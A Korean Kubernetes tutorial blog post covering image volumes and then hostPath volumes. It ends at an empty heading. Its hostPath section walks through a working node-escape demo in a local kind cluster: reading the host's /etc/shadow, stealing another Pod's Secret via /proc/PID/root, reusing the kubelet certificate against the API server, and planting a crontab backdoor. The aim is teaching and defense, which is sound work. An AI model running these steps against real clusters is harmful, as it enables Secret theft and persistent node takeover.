---
title:  "[Kubernetes] Pod 볼륨 - 3. image 볼륨과 hostPath"
excerpt: "image 볼륨으로 컨테이너 이미지의 파일을 다른 컨테이너에 마운트하고, hostPath 볼륨의 동작과 위험성을 정리한다."
categories:
  - Kubernetes
toc: true
header:
  teaser: /assets/images/blog-Dev.jpg
tags:
  - Kubernetes
  - Kubernetes-in-Action-2nd
  - volume
  - image-volume
  - hostPath
  - OCI
  - ImageVolume
  - security
hidden: true
---

*[Kubernetes in Action 2nd Edition](https://www.manning.com/books/kubernetes-in-action-second-edition) 9장의 학습 내용을 기반으로 합니다.*

<br>

# TL;DR

- `image` 볼륨은 OCI 이미지의 파일을 **컨테이너를 실행하지 않고** 다른 컨테이너에 읽기 전용으로 마운트하는 볼륨 타입이다. init 컨테이너 + emptyDir 조합을 대체할 수 있다
- `image` 볼륨은 ImageVolume 피처 게이트(Feature Gate)를 통해 활성화해야 하며, Kubernetes 1.33에서 beta로 승격되었다
- `hostPath` 볼륨은 노드의 파일 시스템 경로를 Pod에 마운트한다. 같은 노드의 Pod끼리만 동일 파일에 접근할 수 있다
- `hostPath`는 **가장 위험한 볼륨 타입 중 하나**다. Secret 탈취, kubelet 인증서 도용, 노드 백도어 삽입 등 심각한 보안 위협이 가능하므로, PodSecurityAdmission의 `restricted` 프로파일로 사용을 제한해야 한다

<br>

# image 볼륨

## 컨테이너 이미지를 파일 배포 매체로

컨테이너 이미지의 본래 목적은 어플리케이션 실행이지만, OCI 이미지 스펙은 단순히 "레이어로 구성된 파일 번들"일 뿐이다. 이 사실에 착안하면, 이미지를 **파일 배포 매체**로도 활용할 수 있다. `image` 볼륨은 바로 이 발상을 Kubernetes 네이티브하게 구현한 볼륨 타입이다.

컨테이너는 사전에 준비된 데이터에 접근해야 하는 경우가 많다. `image` 볼륨은 OCI 이미지의 콘텐츠를 Pod 내 볼륨으로 직접 마운트하여 이 문제를 해결한다. Pod 생성 시 kubelet이 이미지를 pull하고 모든 콘텐츠를 볼륨으로 노출한다. ([Kubernetes 공식 문서: image Volume](https://kubernetes.io/docs/concepts/storage/volumes/#image)) 이전 포스트에서 quiz Pod의 데이터베이스에 문제를 미리 채운 것이 대표적인 예이고, AI 모델 서빙 시 대용량 가중치 파일을 별도 패키징하는 것도 같은 맥락이다.

기존에는 파일이 담긴 컨테이너 이미지를 빌드하고, init 컨테이너가 시작 시 emptyDir 볼륨에 복사한 뒤, 메인 컨테이너가 해당 볼륨을 마운트하는 방식을 사용했다. 하지만 **"한 이미지의 파일을 다른 컨테이너에 전달"하는 단순한 목적치고는 과정이 지나치게 복잡하다** — 별도 이미지 빌드, init 컨테이너 정의, 볼륨 설정, 복사 커맨드까지 필요하기 때문이다.

`image` 타입 볼륨을 사용하면 이 과정을 단순화할 수 있다.

## image 볼륨 타입 소개

`image` 볼륨 타입은 OCI(Open Container Initiative) 이미지에 포함된 파일을 볼륨으로 노출하여, 같은 Pod 내 다른 컨테이너에 마운트할 수 있게 한다. **컨테이너를 실행하지 않고도 컨테이너 이미지에 들어 있는 파일을 다른 컨테이너에 볼륨으로 직접 마운트**할 수 있으며, 다른 컨테이너는 이 볼륨에서 **읽기만 가능하고 쓰기는 불가능**하다.

여기서 "컨테이너 이미지"와 "OCI 이미지"의 개념 차이를 짚고 넘어가자.

- **컨테이너 이미지**: 좁은 의미로, "앱 + 런타임 + 라이브러리"를 패키징한 것이다. `docker run`으로 실행할 수 있는 이미지를 말한다. 예: `nginx:latest`, `mongo:7`
- **OCI 이미지**: 넓은 의미로, OCI 스펙을 따르는 모든 이미지다. 앱이 아니어도 되고, 단순히 파일 몇 개를 레이어로 묶어놓은 것도 OCI 이미지다. 예: `FROM scratch`에 JS 파일 하나만 담은 이미지

ImageVolume은 이미지를 **실행하지 않고** 파일만 꺼내는 것이기 때문에, 굳이 실행 가능한 "컨테이너 이미지"일 필요가 없다. OCI 스펙만 따르면 된다.

### 동작 방식

`image` 볼륨은 이미지를 컨테이너로 "실행"하는 것이 아니라, **이미지의 파일시스템(레이어)에서 파일만 꺼내서 다른 컨테이너에 볼륨으로 마운트하는 것**이다.

- **기존 방식** (ImageVolume 없이):
  - initContainer가 이미지를 실행 → 스크립트로 파일을 emptyDir에 복사 → 다른 컨테이너가 emptyDir 마운트
  - `insert-question.sh`처럼 Pod 생성 후 수동으로 데이터를 삽입
- **ImageVolume 방식**: kubelet이 이미지를 pull → 레이어에서 파일 추출 → 바로 읽기 전용 볼륨으로 마운트

ConfigMap이나 Secret처럼 파일을 제공하되, 그 소스가 컨테이너 이미지인 셈이다. ConfigMap/Secret이 etcd에서 파일을 꺼내서 볼륨으로 주는 것이라면, ImageVolume은 **컨테이너 레지스트리에서 파일을 꺼내서 볼륨으로 준다**고 이해하면 된다.

### 주요 특징과 사용 사례

주요 특징을 정리하면 다음과 같다.

- init 컨테이너 없이도 이미지에 담긴 파일을 볼륨으로 제공 가능
- 데이터를 이미지로 **버전 관리**하고 배포할 수 있음
- 읽기 전용으로 안전하게 마운트됨
- Kubernetes 1.31에서 alpha(알파)로 도입, 1.33에서 beta(베타)로 승격 (ImageVolume 피처 게이트 필요). Kubernetes Feature Gate는 alpha → beta → GA(정식 출시) 순서로 졸업하며, beta부터 기본 활성화된다

사용 사례는 다양하다.

1. **init 컨테이너 방식의 대안** — 이미지에 담긴 파일을 다른 컨테이너에 전달할 때 복잡한 우회 과정 없이 직접 마운트
2. **정적 콘텐츠/에셋 배포** — 웹 서버 컨테이너에 별도 이미지에 패키징된 정적 파일(HTML, CSS, JS 등)을 마운트
3. **바이너리/도구 주입** — 디버깅 도구, CLI 바이너리 등을 별도 이미지에 담아 두고, 필요한 컨테이너에 볼륨으로 마운트
4. **ML 모델 가중치 배포** — 모델 파일을 이미지로 패키징해 두고 서빙 컨테이너에 마운트
5. **설정/스키마 파일 분리** — 어플리케이션 이미지와 설정 파일 이미지를 분리하여 독립적으로 버전 관리

> **Note:** 현재 시점에서는 이미지 아티팩트(Dockerfile로 빌드한 레이어 구조의 컨테이너 이미지)만 지원된다. 향후 모든 OCI 아티팩트를 지원할 계획이 있으며, 그렇게 되면 Dockerfile 없이 `oras push`로 파일을 바로 레지스트리에 올려 볼륨 소스로 사용할 수 있게 된다.

## Kind 클러스터에서 ImageVolume 피처 게이트 활성화

`image` 볼륨 기능은 아직 기본적으로 활성화되어 있지 않으며, **ImageVolume 피처 게이트**를 통해 활성화해야 한다. 피처 게이트는 kubelet/API 서버 레벨의 설정이므로, 기존 클러스터에 적용할 수 없다. 새 클러스터를 만들 때 설정 파일에 명시해야 한다.

> **Note:** 피처 게이트(Feature Gate)는 Kubernetes에서 기능이 GA(Generally Available)되기 전에 기능을 숨겨두는 메커니즘이다. 클러스터 관리자가 명시적으로 활성화해야 하며, 활성화하지 않으면 해당 기능과 관련된 필드가 API에 보이고 설정할 수 있더라도 **실제로 동작하지 않는다.**

Kind 클러스터 설정 파일은 다음과 같다.

```yaml
# kind-multi-node-with-image-volume.yaml
# kubectl apply가 아니라 kind create cluster --config로 사용
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
featureGates:
  ImageVolume: true
nodes:
- role: control-plane
- role: worker
- role: worker
```

기존 클러스터를 삭제한 후, 이 설정 파일로 클러스터를 새로 생성한다. 새 클러스터는 control-plane 1개 + worker 2개의 멀티 노드 구성이며, ImageVolume 피처 게이트가 활성화된다.

> **팁**: 설정 파일 대신 heredoc으로 인라인 주입하는 것도 편리하다.
> ```bash
> kind create cluster --image kindest/node:v1.35.0 --config - <<EOF
> kind: Cluster
> apiVersion: kind.x-k8s.io/v1alpha4
> featureGates:
>   ImageVolume: true
> nodes:
> - role: control-plane
> - role: worker
> - role: worker
> EOF
> ```

```bash
# 기존에 설치된 kind 클러스터 삭제
kind delete cluster --name kind

# 실행 결과
Deleting cluster "kind" ...
Deleted nodes: ["kind-control-plane"]

# 클러스터 새로 생성
kind create cluster --config kind-multi-node-with-image-volume.yaml

# 실행 결과
Creating cluster "kind" ...
 ✓ Ensuring node image (kindest/node:v1.35.0) 🖼
 ✓ Preparing nodes 📦 📦 📦 
 ✓ Writing configuration 📜
 ✓ Starting control-plane 🕹️
 ✓ Installing CNI 🔌
 ✓ Installing StorageClass 💾
 ✓ Joining worker nodes 🚜
Set kubectl context to "kind-kind"

# 새 클러스터 상태 확인
kubectl get nodes

# 실행 결과
NAME                 STATUS   ROLES           AGE     VERSION
kind-control-plane   Ready    control-plane   2m40s   v1.35.0
kind-worker          Ready    <none>          2m30s   v1.35.0
kind-worker2         Ready    <none>          2m30s   v1.35.0
```

피처 게이트가 정상 활성화되었는지 확인하려면, API 서버 파드의 args에서 `feature-gates`를 확인하면 된다.

```bash
kubectl describe pod -n kube-system kube-apiserver-kind-control-plane | grep feature-gates
#       --feature-gates=ImageVolume=true
```

## Pod 매니페스트에서 image 볼륨 정의

quiz Pod에서 사용할 이미지를 먼저 살펴보자. `insert-questions.js` 파일 하나만 포함하는 이미지다.

```docker
# Chapter09/quiz-questions/Dockerfile
FROM scratch
COPY insert-questions.js /
```

`FROM scratch`에 파일 하나만 넣었기 때문에, 컨테이너 실행 시 아무것도 되지 않아 앱이라고 보기 어렵다. 하지만 OCI 스펙을 따르기 때문에 ImageVolume의 소스로 동작한다.

quiz Pod 매니페스트를 업데이트하여, 기존의 init 컨테이너 + emptyDir 볼륨 대신 image 볼륨을 통해 MongoDB에 문제를 제공하도록 한다. 초기화 컨테이너가 더 이상 필요 없고, **emptyDir 볼륨이 image 볼륨으로 대체**되었다.

```yaml
# Chapter09/pod.quiz.imagevolume.yaml
apiVersion: v1
kind: Pod
metadata:
  name: quiz
spec:
  volumes:
  - name: initdb
    image:                                # image 볼륨으로 대체
      reference: luksa/quiz-questions:latest
      pullPolicy: Always
  - name: quiz-data
    emptyDir: {}
  containers:
  - name: quiz-api
    image: luksa/quiz-api:0.1
    imagePullPolicy: IfNotPresent
    ports:
    - name: http
      containerPort: 8080
  - name: mongo
    image: mongo:7
    volumeMounts:
    - name: quiz-data
      mountPath: /data/db
    - name: initdb
      mountPath: /docker-entrypoint-initdb.d/
      readOnly: true
```

`luksa/quiz-questions:latest` 이미지 안의 파일들이 그대로 볼륨이 되어, mongo 컨테이너의 `/docker-entrypoint-initdb.d/`에 마운트된다. MongoDB는 시작 시 해당 디렉토리의 스크립트를 자동 실행하여 데이터를 초기화한다.

## 새 Pod 실행 및 검사

```bash
kubectl apply -f pod.quiz.imagevolume.yaml

# 실행 결과
pod/quiz created

kubectl get po

# 실행 결과
NAME   READY   STATUS              RESTARTS   AGE
quiz   0/2     ContainerCreating   0          3s
```

Pod 볼륨은 Pod의 모든 컨테이너가 시작되기 전에 생성된다. `kubectl describe`로 이벤트를 확인하면, kubelet이 `luksa/quiz-questions:latest` 이미지를 먼저 pull한 것을 볼 수 있다.

<details markdown="1">
<summary>kubectl describe pod quiz 이벤트</summary>

```bash
kubectl describe pod quiz

# 실행 결과 (Events 부분)
Events:
  Type    Reason     Age                From               Message
  ----    ------     ----               ----               -------
  Normal  Scheduled  72s                default-scheduler  Successfully assigned default/quiz to kind-worker2
  Normal  Pulled     68s                kubelet            Successfully pulled image "luksa/quiz-questions:latest" in 4.294s (4.294s including waiting). Image size: 1816 bytes.
  Normal  Pulling    68s                kubelet            spec.containers{quiz-api}: Pulling image "luksa/quiz-api:0.1"
  Normal  Created    64s                kubelet            spec.containers{quiz-api}: Container created
  Normal  Pulled     64s                kubelet            spec.containers{quiz-api}: Successfully pulled image "luksa/quiz-api:0.1" in 3.963s (3.963s including waiting). Image size: 10468990 bytes.
  Normal  Started    63s                kubelet            spec.containers{quiz-api}: Container started
  Normal  Pulling    63s                kubelet            spec.containers{mongo}: Pulling image "mongo:7"
  Normal  Pulled     34s                kubelet            spec.containers{mongo}: Successfully pulled image "mongo:7" in 29.751s (29.751s including waiting). Image size: 279839461 bytes.
  Normal  Created    34s                kubelet            spec.containers{mongo}: Container created
  Normal  Started    34s                kubelet            spec.containers{mongo}: Container started
```

</details>

mongo 컨테이너에서 파일이 제대로 마운트되었는지 확인한다.

```bash
kubectl exec -it quiz -c mongo -- ls -la /docker-entrypoint-initdb.d/

# 실행 결과
total 12
drwxr-xr-x 1 root root 4096 Apr  1 16:50 .
drwxr-xr-x 1 root root 4096 Apr  1 16:50 ..
-rw-rw-r-- 1 root root 2361 Mar 14  2022 insert-questions.js
```

Quiz API를 통해 데이터가 정상적으로 초기화되었는지도 확인할 수 있다.

```bash
kubectl port-forward pod/quiz 8080:8080

# 실행 결과
Forwarding from 127.0.0.1:8080 -> 8080
Forwarding from [::1]:8080 -> 8080
```

```bash
curl localhost:8080/questions/random

# 실행 결과
{"id":6,"text":"Which of the following statements is correct?","correctAnswerIndex":1,"answers":["When the readiness probe fails, the container is restarted.","When the liveness probe fails, the container is restarted.","Containers without a readiness probe are never restarted.","Containers without a liveness probe are never restarted."]}
```

MongoDB가 시작 시 `insert-questions.js` 파일을 실행했으므로, 문제들이 데이터베이스에 정상적으로 저장되어 있다.

## 향후 전망: OCI Artifacts와 ORAS

현재 `image` 볼륨은 Dockerfile로 빌드한 컨테이너 이미지만 지원한다. 하지만 OCI 스펙에는 **OCI Artifacts**라는 개념이 있어, 컨테이너 이미지뿐 아니라 임의의 파일 번들을 레지스트리에 저장할 수 있다. [ORAS(OCI Registry As Storage)](https://oras.land/) CLI를 사용하면 Dockerfile 없이 `oras push`로 파일을 직접 레지스트리에 올릴 수 있다.

향후 `image` 볼륨이 OCI Artifacts를 지원하게 되면, Dockerfile 빌드 과정 없이 설정 파일이나 모델 가중치를 레지스트리에 push하고 볼륨으로 마운트하는 워크플로우가 가능해진다.

<br>

# hostPath 볼륨

## 노드와 Pod의 경계를 넘는 볼륨

Kubernetes의 핵심 추상화는 워크로드를 노드에서 격리하는 것이다. Pod는 어떤 노드에서 실행되는지 몰라야 하고, 노드 교체/추가에도 영향받지 않아야 한다. `hostPath`는 이 추상화를 **의도적으로 깨뜨리는** 볼륨 타입이다. 노드의 파일시스템을 Pod에 직접 노출하므로, 사용 시 보안과 이식성 모두를 신중하게 따져야 한다.

대부분의 Pod는 자신이 어떤 호스트 노드에서 실행되고 있는지 몰라야 하고, 노드의 파일 시스템에 있는 어떠한 파일에도 접근해서는 안 된다. `hostPath`는 이 원칙의 예외로, 호스트 노드의 파일시스템을 Pod에 직접 마운트한다. 공식 문서도 **보안 위험을 수반하며, 가능하면 사용을 피하라**고 명시하고 있다. ([Kubernetes 공식 문서: hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)) 다만 시스템 레벨의 Pod(DaemonSet 등)는 예외로, 이들은 노드의 파일을 읽거나 파일 시스템을 통해 노드 장치 등의 컴포넌트에 접근해야 할 필요가 있다. Kubernetes는 이를 위해 `hostPath` 볼륨 타입을 제공한다.

## hostPath 소개

`hostPath` 볼륨은 **노드의 파일 시스템 경로를 Pod에 마운트**하는 범용 볼륨 타입으로, 호스트 노드의 파일 시스템에 있는 특정 파일이나 디렉터리를 가리킨다. 같은 노드에서 실행되고 같은 `hostPath` 경로를 사용하는 Pod들은 동일한 파일에 접근할 수 있지만, **다른 노드의 Pod는 접근할 수 없다.**

![hostPath 볼륨 다이어그램]({{site.url}}/assets/images/k8s-vol-03-hostpath-volume.png){: .align-center}

`hostPath` 볼륨은 해당 Pod가 항상 같은 노드에서 실행되도록 보장하지 않는 한, Pod의 데이터를 저장하기에 적합하지 않다.

- 볼륨의 내용이 특정 노드의 파일 시스템에 저장되기 때문에, Pod가 다른 노드로 재스케줄링되면 데이터에 접근할 수 없다
- 일반적으로 `hostPath` 볼륨은 Pod가 노드의 파일 시스템에서 프로세스가 생성하거나 읽는 파일(예: 시스템 로그)에 접근해야 하는 경우에 사용된다

### 위험성 경고

`hostPath`는 **Kubernetes에서 가장 위험한 볼륨 타입 중 하나**이며, 보통 privileged Pod에서만 사용해야 한다. `hostPath`의 무제한 사용을 허용하면, 클러스터 사용자가 노드에서 원하는 모든 작업을 수행할 수 있다. 예를 들어, Docker 소켓 파일(일반적으로 `/var/run/docker.sock`)을 컨테이너에 마운트하고, 컨테이너 내부에서 Docker 클라이언트를 실행하여 호스트 노드에서 root 사용자로 임의의 명령을 실행할 수 있다.

실제 사용 맥락을 보면:

- **시스템 레벨 Pod**(DaemonSet 등)에서 가장 많이 쓰인다. 예: 로그 수집기(Fluentd, Filebeat)가 `/var/log`를 읽거나, 모니터링 에이전트가 `/sys`, `/proc`에 접근하는 경우
- **일반 워크로드에서도 사용 가능**하지만 권장되지 않는다. Pod가 특정 노드에 종속되어 이식성이 떨어지고, 보안 위험이 크다
- 일반 애플리케이션에는 PV/PVC 같은 추상화된 스토리지를 사용하는 것이 바람직하다

## hostPath 사용 예제: node-explorer Pod

`hostPath` 볼륨이 얼마나 위험한지 실증하기 위해, Pod 내부에서 호스트 노드의 전체 파일 시스템을 탐색할 수 있는 Pod를 배포한다. 볼륨은 노드 파일 시스템의 루트 디렉터리(`/`)를 가리키며, Pod가 스케줄링된 노드의 전체 파일 시스템에 접근할 수 있게 한다.

```yaml
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: node-explorer
spec:
  volumes:
  # 노드의 루트 파일시스템(/)을 볼륨으로 정의
  - name: host-root
    hostPath:
      path: /          # 노드의 / (루트) 전체를 볼륨 소스로 지정
  containers:
  - name: node-explorer
    image: alpine
    command: ["sleep", "infinity"]   # 컨테이너를 종료 없이 유지 (탐색용)
    volumeMounts:
    - name: host-root
      mountPath: /host   # 노드의 /가 컨테이너의 /host에 마운트됨
                         # → /host/etc = 노드의 /etc
                         # → /host/var/log = 노드의 /var/log 등
EOF
```

```bash
kubectl get po

# 실행 결과
NAME            READY   STATUS    RESTARTS   AGE
node-explorer   1/1     Running   0          59s
```

컨테이너와 셸 명령이 root로 실행되고 있으므로 워커 노드의 모든 파일을 수정할 수 있다.

> **Note:** 클러스터에 워커 노드가 여러 개인 경우, Pod는 임의의 노드에 스케줄링된다. 특정 노드에 배포하려면 `.spec.nodeName` 필드를 해당 노드 이름으로 설정하면 된다.

```bash
kubectl exec -it node-explorer -- sh

# Pod 안에서 호스트 파일시스템 탐색
/ # ls -al /host

# 실행 결과
total 64
drwxr-xr-x    1 root     root          4096 Apr  1 16:34 .
drwxr-xr-x    1 root     root          4096 Apr  2 01:12 ..
-rwxr-xr-x    1 root     root             0 Apr  1 16:34 .dockerenv
drw-r--r--   99 root     root          4096 Dec 15 23:24 LICENSES
lrwxrwxrwx    1 root     root             7 Dec  8 00:00 bin -> usr/bin
drwxr-xr-x    2 root     root          4096 Aug 24  2025 boot
drwxr-xr-x   10 root     root          3440 Apr  1 16:34 dev
drwxr-xr-x    1 root     root          4096 Apr  1 16:34 etc
...
```

`/host` 아래에 워커 노드의 전체 파일 시스템이 그대로 보인다. 실제로 공격자가 Kubernetes API에 접근하여 이 유형의 Pod를 프로덕션 클러스터에 배포할 수 있다. Kubernetes는 기본적으로 일반 사용자가 `hostPath` 볼륨을 사용하는 것을 막지 않는다.

## hostPath 위험성 체감

`hostPath: /`는 노드의 root 접근 권한과 동일하므로 매우 위험한 볼륨이다. 프로덕션 환경에서는 PodSecurityAdmission의 `restricted` 프로파일로 hostPath 사용을 반드시 차단해야 한다. 아래 시나리오들을 통해 위험성을 직접 체감해 보자.

### 사전 준비

`node-explorer` Pod를 배포한다.

```bash
# node-explorer 배포
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: node-explorer
spec:
  volumes:
  - name: host-root
    hostPath:
      path: /
  containers:
  - name: node-explorer
    image: alpine
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: host-root
      mountPath: /host
YAML

# 실행 결과
pod/node-explorer created

# Pod 확인
kubectl get pod node-explorer -o wide

# 실행 결과
NAME            READY   STATUS    RESTARTS   AGE   IP           NODE          NOMINATED NODE   READINESS GATES
node-explorer   1/1     Running   0          17m   10.244.1.2   kind-worker   <none>           <none>
```

### 노드 OS 레벨 설정 조회/조작

컨테이너 안에서 노드의 OS 레벨 설정을 직접 조회하고 조작할 수 있다.

```bash
# Pod 안에서 호스트의 /etc/shadow 읽기 (패스워드 해시)
/ # cat /host/etc/shadow

# 실행 결과
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
...

# 호스트의 /etc/hostname 변경
/ # echo "hacked-node" > /host/etc/hostname
```

### 다른 Pod의 Secret 탈취

kubelet이 마운트한 시크릿은 호스트 파일시스템에 있으므로, 같은 노드의 다른 Pod에 마운트된 Secret까지 읽을 수 있다.

먼저 시크릿을 생성하고, 그 시크릿을 사용하는 `victim-app` Pod를 같은 노드에 배치한다.

```bash
# 시크릿 생성
kubectl create secret generic super-secret \
  --from-literal=password='S3cr3tP@ssw0rd!' \
  --from-literal=api-key='sk-1234567890abcdef'

# 실행 결과
secret/super-secret created
```

```yaml
# 시크릿 사용 Pod(victim-app) 생성: node-explorer와 같은 노드에 배치
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: victim-app
spec:
  nodeName: kind-worker
  volumes:
  - name: secret-vol
    secret:
      secretName: super-secret
  containers:
  - name: app
    image: alpine
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: secret-vol
      mountPath: /etc/secrets
      readOnly: true
YAML
```

Secret은 tmpfs로 컨테이너의 mount namespace 안에만 마운트되기 때문에, 호스트 경로에서 직접 읽으면 비어 있다. 하지만 `/proc/<PID>/root/`를 통하면 해당 프로세스의 mount namespace를 따라가므로, tmpfs 위의 Secret 파일까지 그대로 읽을 수 있다.

<details markdown="1">
<summary>Secret 탈취 전체 과정</summary>

```bash
# kubelet 디렉토리에서 secret 디렉토리 탐색
kubectl exec node-explorer -- sh -c '
find /host/var/lib/kubelet/pods -type d -name "kubernetes.io~secret" 2>/dev/null'

# 실행 결과
/host/var/lib/kubelet/pods/3e004f64-5bba-4e97-b32b-8a8dcaa45f2e/volumes/kubernetes.io~secret

# 직접 읽기 시도: 실패 → tmpfs 마운트이므로 비어 있음
kubectl exec node-explorer -- sh -c '
POD=3e004f64-5bba-4e97-b32b-8a8dcaa45f2e
ls -la /host/var/lib/kubelet/pods/$POD/volumes/kubernetes.io~secret/secret-vol/'

# 실행 결과
total 8
drwxrwxrwx    2 root     root          4096 Apr  2 02:23 .
drwxr-xr-x    3 root     root          4096 Apr  2 02:23 ..

# /proc를 통한 우회: victim-app의 PID 찾기
# cgroup에 victim-app의 Pod UID가 포함된 PID가 타겟
kubectl exec node-explorer -- sh -c '
for pid in /host/proc/[0-9]*; do
  cmdline=$(cat "$pid/cmdline" 2>/dev/null | tr "\0" " ")
  if echo "$cmdline" | grep -q "sleep infinity" 2>/dev/null; then
    p=$(basename $pid)
    cg=$(cat "$pid/cgroup" 2>/dev/null)
    echo "PID=$p  cmd=$cmdline"
    echo "  cgroup: $cg"
    echo ""
  fi
done'

# 실행 결과
PID=4117  cmd=sleep infinity
  cgroup: 0::/

PID=6082  cmd=sleep infinity
  cgroup: 0::/../../kubelet-kubepods-besteffort-pod3e004f64_5bba_4e97_b32b_8a8dcaa45f2e.slice/cri-containerd-07cd41db...scope

# /proc/PID/root를 통한 Secret 탈취!
kubectl exec node-explorer -- sh -c '
VICTIM_PID=6082

echo "=== /proc/PID/root 를 통해 Secret 경로 확인 ==="
ls -la /host/proc/$VICTIM_PID/root/etc/secrets/
echo ""
echo "=== Secret 탈취! ==="
echo -n "password: "; cat /host/proc/$VICTIM_PID/root/etc/secrets/password
echo ""
echo -n "api-key:  "; cat /host/proc/$VICTIM_PID/root/etc/secrets/api-key'

# 실행 결과
=== /proc/PID/root 를 통해 Secret 경로 확인 ===
total 4
drwxrwxrwt    3 root     root           120 Apr  2 02:23 .
drwxr-xr-x    1 root     root          4096 Apr  2 02:23 ..
drwxr-xr-x    2 root     root            80 Apr  2 02:23 ..2026_04_02_02_23_05.3427574610
lrwxrwxrwx    1 root     root            32 Apr  2 02:23 ..data -> ..2026_04_02_02_23_05.3427574610
lrwxrwxrwx    1 root     root            14 Apr  2 02:23 api-key -> ..data/api-key
lrwxrwxrwx    1 root     root            15 Apr  2 02:23 password -> ..data/password

=== Secret 탈취! ===
password: S3cr3tP@ssw0rd!
api-key:  sk-1234567890abcdef
```

</details>

핵심은, `/proc/<PID>/root/`가 해당 프로세스의 mount namespace를 따라가므로, tmpfs 위의 Secret 파일까지 그대로 읽을 수 있다는 것이다. `hostPath: /`만 있으면 같은 노드의 **모든 Pod의 Secret**을 탈취할 수 있다.

### kubelet 인증서로 API 서버 접근

kubelet의 kubeconfig를 탈취하면 API 서버에 `system:node` 권한으로 요청을 보낼 수 있다.

<details markdown="1">
<summary>kubelet 인증서 탈취 및 API 서버 접근 전체 과정</summary>

```bash
# kubelet kubeconfig 탈취
kubectl exec node-explorer -- cat /host/etc/kubernetes/kubelet.conf

# 실행 결과
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTi...
    server: https://kind-control-plane:6443
  name: default-cluster
contexts:
- context:
    cluster: default-cluster
    namespace: default
    user: default-auth
  name: default-context
current-context: default-context
kind: Config
users:
- name: default-auth
  user:
    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem

# kubelet 인증서 파일 확인
kubectl exec node-explorer -- ls -la /host/var/lib/kubelet/pki/

# 실행 결과
total 20
drwxr-xr-x    2 root     root          4096 Apr  1 16:35 .
drwx------   10 root     root          4096 Apr  2 01:31 ..
-rw-------    1 root     root          1118 Apr  1 16:35 kubelet-client-2026-04-01-16-35-11.pem
lrwxrwxrwx    1 root     root            59 Apr  1 16:35 kubelet-client-current.pem -> /var/lib/kubelet/pki/kubelet-client-2026-04-01-16-35-11.pem
-rw-r--r--    1 root     root          2291 Apr  1 16:35 kubelet.crt
-rw-------    1 root     root          1679 Apr  1 16:35 kubelet.key

# 인증서를 사용하여 API 서버에 접근 시도
# system:node:kind-worker로 인증되지만, 일반 Pod 목록 조회는 거부됨
kubectl exec node-explorer -- sh -c '
cp /host/var/lib/kubelet/pki/kubelet-client-2026-04-01-16-35-11.pem /tmp/kubelet-client.pem
cp /host/etc/kubernetes/pki/ca.crt /tmp/ca.crt

curl -sk --connect-timeout 5 \
  --cert /tmp/kubelet-client.pem \
  --key /tmp/kubelet-client.pem \
  --cacert /tmp/ca.crt \
  --resolve "kind-control-plane:6443:172.18.0.2" \
  "https://kind-control-plane:6443/api/v1/namespaces/default/pods?limit=3"'

# 실행 결과
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "pods is forbidden: User \"system:node:kind-worker\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\": can only list/watch pods with spec.nodeName field selector",
  "reason": "Forbidden",
  "code": 403
}

# 자기 노드의 Pod 조회 (성공!)
kubectl exec node-explorer -- sh -c '
curl -sk --connect-timeout 5 \
  --cert /tmp/kubelet-client.pem \
  --key /tmp/kubelet-client.pem \
  --cacert /tmp/ca.crt \
  --resolve "kind-control-plane:6443:172.18.0.2" \
  "https://kind-control-plane:6443/api/v1/pods?fieldSelector=spec.nodeName%3Dkind-worker&limit=5"' \
  | grep '"name"' | head -5

# 실행 결과
            "name": "node-explorer",
                "name": "host-root",
                "name": "kube-api-access-6rzt9",
                        "name": "kube-root-ca.crt",
                "name": "node-explorer",

# Secret 직접 조회: 성공!
# kubelet은 자기 노드의 Pod가 참조하는 Secret을 읽을 수 있음
kubectl exec node-explorer -- sh -c '
curl -sk --connect-timeout 5 \
  --cert /tmp/kubelet-client.pem \
  --key /tmp/kubelet-client.pem \
  --cacert /tmp/ca.crt \
  --resolve "kind-control-plane:6443:172.18.0.2" \
  "https://kind-control-plane:6443/api/v1/namespaces/default/secrets/super-secret"' | head -15

# 실행 결과
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "super-secret",
    "namespace": "default",
    "uid": "32e0b174-abaf-477a-bf66-d1296d213704",
    "resourceVersion": "30540",
    "creationTimestamp": "2026-04-02T01:30:41Z",
    ...
```

</details>

kubelet 인증서를 탈취하면 `system:node` 권한으로 API 서버에 인증되고, 해당 노드의 Pod가 참조하는 Secret까지 API로 조회할 수 있다.

### host crontab에 백도어 삽입

호스트 파일시스템에 쓰기가 가능하면 노드에 영구적인 백도어를 심을 수 있다.

<details markdown="1">
<summary>crontab 백도어 삽입 데모</summary>

```bash
# 호스트 쓰기 가능 여부 확인
kubectl exec node-explorer -- sh -c '
touch /host/tmp/hostpath-write-test && echo "WRITABLE" || echo "NOT WRITABLE"'

# 실행 결과
WRITABLE

# crontab에 백도어 삽입 (무해한 데모)
kubectl exec node-explorer -- sh -c '
echo "=== 기존 crontab ==="
cat /host/etc/crontab
echo ""
echo "=== 백도어 크론 삽입 (무해한 데모) ==="
echo "* * * * * root echo BACKDOOR_DEMO >> /tmp/pwned.log" >> /host/etc/crontab && echo "CRONTAB MODIFIED!" || echo "CRONTAB WRITE FAILED"
echo ""
echo "=== 수정 후 crontab ==="
cat /host/etc/crontab'

# 실행 결과
=== 기존 crontab ===

=== 백도어 크론 삽입 (무해한 데모) ===
CRONTAB MODIFIED!

=== 수정 후 crontab ===
* * * * * root echo BACKDOOR_DEMO >> /tmp/pwned.log

# 정리
kubectl exec node-explorer -- sh -c '
echo -n "" > /host/etc/crontab
rm -f /host/tmp/hostpath-write-test /host/tmp/pwned.log'
```

</details>

Pod가 삭제되어도 crontab에 삽입한 백도어는 노드에 남아 있다. `hostPath` 볼륨으로 노드 파일시스템에 쓰기가 가능하면, 이처럼 노드에 영구적인 백도어를 심을 수 있다.

## hostPath 볼륨 타입 지정

